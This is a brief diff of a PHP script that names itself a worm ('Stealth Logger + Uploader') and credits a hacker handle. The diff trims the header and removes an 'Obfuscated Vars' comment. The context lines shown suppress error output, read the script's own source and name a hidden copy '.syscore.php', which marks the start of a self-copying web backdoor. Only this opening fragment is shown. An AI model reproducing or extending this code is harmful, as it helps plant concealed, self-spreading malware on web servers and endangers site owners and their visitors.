@@ -1,6 +1,6 @@
 <?php
 /*
- * [6ickZone is Worm v2.3s — Stealth Logger + Uploader]
+ * [6ickZone is Worm v2.3s —  Uploader]
  * by 0x6ick - t.me/Yungx6ick
  */
 
@@ -8,7 +8,6 @@
 @ini_set('display_errors', 0);
 @error_reporting(0);
 
-// === Obfuscated Vars ===
 $_1 = basename(__FILE__);
 $_2 = file_get_contents(__FILE__);
 $_3 = '.syscore.php';
